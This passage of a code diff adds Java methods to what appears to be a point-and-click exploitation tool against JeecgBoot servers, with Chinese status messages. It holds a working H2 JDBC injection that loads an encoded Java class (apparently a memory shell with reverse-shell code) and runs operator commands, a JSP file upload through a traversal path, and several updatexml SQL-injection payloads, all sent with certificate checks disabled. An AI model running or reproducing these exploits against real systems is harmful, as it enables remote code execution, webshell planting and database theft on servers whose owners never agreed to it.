+            //   BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+                response.append(inputLine);
+            }
+
+            int responseCode = connection.getResponseCode();
+
+            //    String jsonStr = response.toString();
+            //   JSONObject jsonObject = JSONObject.fromObject(jsonStr);
+            //   JSONObject result = (JSONObject) jsonObject.get("result");
+            ///   JSONArray fieldList = (JSONArray) result.get("fieldList");
+            //   for (Object field : fieldList) {
+            //      if (field instanceof JSONObject) {
+            //         JSONObject fieldObject = (JSONObject) field;
+
+            //       String fieldName = (String) fieldObject.get("fieldName");
+            //    System.out.println("fieldName: " + fieldName);
+
+            //  }
+            //   }
+
+
+            if (response.toString().contains("87685675765")) {
+
+
+                test3.appendText(formattedDateTime + line + "[+++]存在jeect-boot testConnection远程命令执行漏洞" + "\n");
+                //      test2.appendText(fieldName.toString() + "\n");
+                //    test3.appendText("\n"+response.toString());
+
+
+            } else {
+
+                //   test3.appendText(formattedDateTime + line + "[-]不存在jeect-boot testConnection远程命令执行漏洞" + "\n");
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            //  test3.appendText(formattedDateTime + line + "[-]不存在jeect-boot testConnection远程命令执行漏洞-" + "\n");
+            //     System.out.println(e);
+
+        }
+
+
+    }
+
+    public void jeecgcmd() {
+        String url = test1.getText();
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+        }
+
+
+        try {
+            //  System.setProperty("http.proxyHost", "127.0.0.1");
+            //    System.setProperty("http.proxyPort", "8080");
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            Random random = new Random();
+            int randomNumber = random.nextInt(100);
+
+            URL url1 = new URL(url + "/jmreport/testConnection");
+            String json = "{\n" +
+                    "          \"id\":\"1\",\n" +
+                    "          \"code\":\"ABC\",\n" +
+                    "          \"dbType\":\"MySQL\",\n" +
+                    "          \"dbDriver\":\"org.h2.Driver\",\n" +
+                    "          \"dbUrl\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\\\;}catch (Exception e){e.printStackTrace()\\\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\\\\\"defineClass\\\\\\\", byte[].class,int.class,int.class)\\\\;defineClassMethod.setAccessible(true)\\\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\\\;clz.newInstance()\\\\;}'\\\\;CALL EXEC('yv66vgAAADEBawoAHQCSCgBEAJMKAEQAlAoAHQCVCACWCgAbAJcKAJgAmQoAmACaBwCbCgBEAJwIAIwKACAAnQgAnggAnwcAoAgAoQgAogcAowoAGwCkCAClCACmBwCnCwAWAKgLABYAqQgAqggAqwcArAoAGwCtBwCuCgCvALAIALEHALIIALMKAH4AtAoAIAC1CAC2CQAmALcHALgKACYAuQgAugoAfgC7CgAbALwIAL0HAL4KABsAvwgAwAcAwQgAwggAwwoAGwDEBwDFCgBEAMYKAMcAuwgAyAoAIADJCADKCgAgAMsIAMwKACAAzQoAIADOCADPCgAgANAIANEJAH4A0goAJgDTCgAmANQJAH4A1QcA1goARADXCgBEANgIAI0IANkKAH4A2ggA2woA3ADdCgAgAN4IAN8IAOAIAOEHAOIKAFAAkgoAUADjCADkCgBQAOUIAOYIAOcIAOgIAOkKAOoA6woA6gDsBwDtCgDuAO8KAFsA8AgA8QoAWwDyCgBbAPMKAFsA9AoA7gD1CgDuAPYKAC8A5QgA9woAIAD4CAD5CgDqAPoHAPsKACYA/AoAaQD9CgBpAO8KAO4A/goAaQD+CgBpAP8KAQABAQoBAAECCgEDAQQKAQMBBQUAAAAAAAAAMgoARAEGCgDuAQcKAGkBCAgBCQoALwEKCAELCAEMCgB+AQ0HAQ4BAAJpcAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBvcnQBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAHZXhlY3V0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAB3JldmVyc2UBADkoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9JbnRlZ2VyOylMamF2YS9sYW5nL1N0cmluZzsBAANydW4BAApTb3VyY2VGaWxlAQAHQTQuamF2YQwAgwCEDAEPARAMAREBEgwBEwEUAQAHdGhyZWFkcwwBFQEWBwEXDAEYARkMARoBGwEAE1tMamF2YS9sYW5nL1RocmVhZDsMARwBHQwBHgEfAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MASABFAEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwBIQEiDAEaASMBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwBJAElAQAQamF2YS9sYW5nL09iamVjdAcBJgwBJwEoAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAigCLDAEpASoBAAlzZXRTdGF0dXMMASsBLAEAEWphdmEvbGFuZy9JbnRlZ2VyDACDAS0BACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsMAIgAiQwBLgEvAQAIc2V0Qnl0ZXMBAAJbQgwBMAElAQAHZG9Xcml0ZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAwBMQCJAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MATIBMwcBNAEAAAwBNQE2AQAQY29tbWFuZCBub3QgbnVsbAwBNwEdAQAFIyMjIyMMATgBOQwBOgE7AQABOgwBPAE9AQAiY29tbWFuZCByZXZlcnNlIGhvc3QgZm9ybWF0IGVycm9yIQwAfwCADAE+AT8MAUABQQwAgQCCAQAQamF2YS9sYW5nL1RocmVhZAwAgwFCDAFDAIQBAAVAQEBAQAwAjACLAQAHb3MubmFtZQcBRAwBRQCLDAFGAR0BAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBRwFIAQAFIC1uIDQMAUkBHQEAAi9jAQAFIC10IDQBAAJzaAEAAi1jBwFKDAFLAUwMAIwBTQEAEWphdmEvdXRpbC9TY2FubmVyBwFODAFPAVAMAIMBUQEAAlxhDAFSAVMMAVQBVQwBVgEdDAFXAVAMAVgAhAEABy9iaW4vc2gMAIMBWQEAB2NtZC5leGUMAIwBWgEAD2phdmEvbmV0L1NvY2tldAwBWwEiDACDAVwMAV0BXgwBXwFVBwFgDAFhASIMAWIBIgcBYwwBZAEtDAFlAIQMAWYBZwwBaAEiDAFpAIQBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBagEdAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEMAI0AjgEAAkE0AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQANZ2V0U3VwZXJjbGFzcwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEKEkpVgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBABcoTGphdmEvbGFuZy9SdW5uYWJsZTspVgEABXN0YXJ0AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEADmdldEVycm9yU3RyZWFtAQAHZGVzdHJveQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACGludFZhbHVlAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGlzQ2xvc2VkAQATamF2YS9pby9J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')\",\n" +
+                    "          \"dbName\":\"383BAb7deFC825E6\",\n" +
+                    "          \"dbPassword\":\"917982\",\n" +
+                    "          \"userName\":\"917982\"\n" +
+                    "        }";
+            //   String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://" + randomNumber + "." + ml.getText() + "\", \"autoCommit\": true}";
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            connection.setDoOutput(true);
+            connection.setRequestMethod("POST");
+            // String a;
+            //      ml.setText(randomNumber + "." + ml.getText());
+            //  String a;
+            //   a = ml.getText();
+
+            connection.setRequestProperty("Content-Type", "application/json");
+            connection.setRequestProperty("cmd", cmd1.getText());
+            byte[] input = json.getBytes(StandardCharsets.UTF_8);
+            OutputStream os = connection.getOutputStream();
+            os.write(input, 0, input.length);
+            os.flush();
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            //  byte[] input = json.getBytes(StandardCharsets.UTF_8);
+            //  OutputStream os = connection.getOutputStream();
+            //   os.write(input, 0, input.length);
+            //   os.flush();
+            //   BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+                response.append(inputLine);
+
+            }
+
+
+            testss.appendText(response.toString() + "\n");
+
+
+            //  }
+            //   }
+            //    String text = testss.getText().replace("success", "").replace("message", "").replace("code", "").replace("result", "").replace("result", "").replace("timestamp", "");
+            //   testss.setText(text);
+
+            //    testss.appendText(response.toString().replace("success", "").replace("true,", "").replace("message", "").replace("数据库连接成功", "").replace("code", "").replace("200", "").replace("result", ""));
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            testss.appendText(formattedDateTime + url + "[-]命令执行失败-" + "\n");
+            //     System.out.println(e);
+
+        }
+
+
+    }
+
+    public void jeecggetshell() {
+
+
+        String url = test1.getText();
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+        }
+
+
+        try {
+            //  System.setProperty("http.proxyHost", "127.0.0.1");
+            //    System.setProperty("http.proxyPort", "8080");
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            Random random = new Random();
+            int randomNumber = random.nextInt(100);
+
+            URL url1 = new URL(url + "/api/../commonController.do?parserXml");
+            // String json = "";
+            //   String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://" + randomNumber + "." + ml.getText() + "\", \"autoCommit\": true}";
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            connection.setDoOutput(true);
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
+            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4");
+            connection.setRequestProperty("Accept-Encoding", "gzip, deflate");
+            String boundary = "----WebKitFormBoundaryyfyhSCMs9cajzFD4";
+            StringBuilder requestBody = new StringBuilder();
+            requestBody.append("--").append(boundary).append("\r\n");
+            requestBody.append("Content-Disposition: form-data; name=\"name\"\r\n");
+            requestBody.append("\r\n");
+            requestBody.append("qwe.png").append("\r\n");
+
+            requestBody.append("--").append(boundary).append("\r\n");
+            requestBody.append("Content-Disposition: form-data; name=\"documentTitle\"\r\n");
+            requestBody.append("\r\n");
+            requestBody.append("blank").append("\r\n");
+
+            requestBody.append("--").append(boundary).append("\r\n");
+            requestBody.append("Content-Disposition: form-data; name=\"file\"; filename=\"qwer.jsp\"\r\n");
+            requestBody.append("Content-Type: image/png\r\n");
+            requestBody.append("\r\n");
+            requestBody.append("<% out.println(\"hello,jeecg\");%>").append("\r\n");
+
+            requestBody.append("--").append(boundary).append("--").append("\r\n");
+            byte[] requestData = requestBody.toString().getBytes("UTF-8");
+            connection.setRequestProperty("Content-Length", String.valueOf(requestData.length));
+
+            OutputStream outputStream = connection.getOutputStream();
+            outputStream.write(requestData);
+            outputStream.flush();
+            outputStream.close();
+
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+            }
+            response.append(inputLine);
+
+            if (response.toString().contains("操作成功")) {
+
+                test2.appendText(formattedDateTime + url + "[+++]存在jeecg-boot commonController 任意文件上传漏洞" + "\n");
+                test2.appendText(url + "/" + "qwer.jsp");
+            } else {
+
+                test2.appendText(formattedDateTime + url + "[-]不存在jeecg-boot commonController 任意文件上传漏洞" + "\n");
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            test2.appendText(formattedDateTime + "[-]不存在jeecg-boot commonController 任意文件上传漏洞-" + "\n");
+            //   System.out.println(e);
+
+        }
+
+
+    }
+
+    public void jeecgfgdg() {
+
+        try {
+
+
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+
+
+            //     String url1 = test1.getText();
+
+            String params = "{\"apiSelectId\":\"1290104038414721025\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '\"}";
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+
+            OkHttpClient client = new OkHttpClient.Builder()
+                    .sslSocketFactory(OkHttpssl.getIgnoreInitedSslContext().getSocketFactory(), OkHttpssl.IGNORE_SSL_TRUST_MANAGER_X509)
+                    .hostnameVerifier(OkHttpssl.getIgnoreSslHostnameVerifier())
+                    .build();
+            RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), params);
+
+            Request request = new Request.Builder()
+
+                    .url(url + "/jeecg-boot/jmreport/qurestSql")
+
+
+                    .post(requestBody)
+                    .build();
+
+            Response response = client.newCall(request).execute();
+
+            String responseBody = response.body().string();
+            if (responseBody.contains("49ba59abbe56e057")) {
+
+                test2.appendText(formattedDateTime + url + "[+++]可能存在Jeecg-Boot qurestSql-SQL注入漏洞" + "\n");
+                //  test2.appendText(response.toString());
+
+
+            } else {
+
+                test2.appendText(formattedDateTime + url + "[-]不存在Jeecg-Boot qurestSql-SQL注入漏洞" + "\n");
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            //  e.printStackTrace();
+
+            test2.appendText(formattedDateTime + "[-]不存在Jeecg-Boot qurestSql-SQL注入漏洞-" + "\n");
+        }
+
+    }
+
+    public void jeecggfg() {
+
+
+        try {
+
+
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+
+
+            //     String url1 = test1.getText();
+
+            String params = "{\"apiSelectId\":\"1316997232402231298\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(jeecg))),1)) or '%%' like '\"}";
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+
+            OkHttpClient client = new OkHttpClient.Builder()
+                    .sslSocketFactory(OkHttpssl.getIgnoreInitedSslContext().getSocketFactory(), OkHttpssl.IGNORE_SSL_TRUST_MANAGER_X509)
+                    .hostnameVerifier(OkHttpssl.getIgnoreSslHostnameVerifier())
+                    .build();
+
+            //    RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), params);
+
+            Request request = new Request.Builder()
+
+
+                    .url(url + "/jeecg-boot/sys/ng-alain/getDictItemsByTable/' from sys_user/*, '/x.js")
+
+
+                    //  .post(requestBody)
+                    .build();
+
+            Response response = client.newCall(request).execute();
+
+            String responseBody = response.body().string();
+            if (responseBody.contains("create_by")) {
+
+                test2.appendText(formattedDateTime + url + "[+++]存在jeecg-boot-getDictItemsByTable-sqli注入漏洞" + "\n");
+                test2.appendText(url + "/jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js" + "\n");
+
+
+            } else {
+
+                test2.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-getDictItemsByTable-sqli注入漏洞" + "\n");
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            //  e.printStackTrace();
+
+            test2.appendText(formattedDateTime + "[-]不存在jeecg-boot-getDictItemsByTable-sqli注入漏洞-" + "\n");
+        }
+
+    }
+
+    public void jeecgdsd() {
+
+
+        try {
+
+
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+
+
+            //     String url1 = test1.getText();
+
+            String params = "{\"apiSelectId\":\"1316997232402231298\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(jeecg))),1)) or '%%' like '\"}";
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+
+            OkHttpClient client = new OkHttpClient.Builder()
